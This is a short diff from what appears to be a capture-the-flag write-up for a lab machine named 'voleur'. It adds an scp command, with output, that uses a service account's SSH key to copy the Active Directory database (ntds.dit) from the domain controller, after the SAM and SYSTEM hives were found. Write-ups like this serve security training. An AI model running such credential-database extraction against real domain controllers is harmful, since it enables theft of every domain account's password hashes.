@@ -583,6 +583,17 @@ SECURITY  SYSTEM
 ```
 Found the SAM and SYSTEM hives
 
+```python
+scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* . 
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+ntds.dit                                                                             100%   24MB  12.3MB/s   00:01    
+ntds.jfm
+```
+This download the ntds.dit file
 
+```python
 
+```
 
